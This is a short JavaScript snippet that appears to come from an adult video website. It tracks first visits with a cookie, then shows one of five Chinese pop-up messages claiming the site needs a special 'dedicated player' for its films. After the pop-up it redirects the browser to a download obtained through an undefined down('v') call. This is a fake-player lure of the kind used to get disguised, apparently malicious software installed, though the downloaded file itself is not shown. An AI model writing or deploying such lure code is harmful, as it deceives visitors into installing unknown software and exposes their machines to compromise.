function setC(name,value)
  {var Days = 1;  var exp = new Date(); exp.setTime(exp.getTime() + Days*24*60*60*1000);    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();}
function getC(name)
  {var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");if(arr=document.cookie.match(reg))   return unescape(arr[2]);else return null;}
var x=0;
if(  getC("s6")==1 )   { setC("s6",1); }
else                   { setC("s6",1);  x=1;  } 
  
function tit()
{
var ts=Math.floor(Math.random()*5+1);
var xx;
if(ts==1)
  xx="下载本站专用成年人播放器,安装后即可观看本站2W部成年人片！";
if(ts==2)
  xx="没测到播放器,请下载情涩播放器,安装运行即可无限爽片！";
if(ts==3)
  xx="提示：本站采用秘密播放器点播，是否立刻运行观看？";
if(ts==4)
  xx="提示：本站所有激情电影采用专业用播放器，是否下载安装观看？";
if(ts==5)
  xx="本站高清日韩爽片采用专用播放器播放，是否下载安装观看？";
return xx;
}

function ddd(x)
{
alert(tit());
window.location.href=down('v');
}



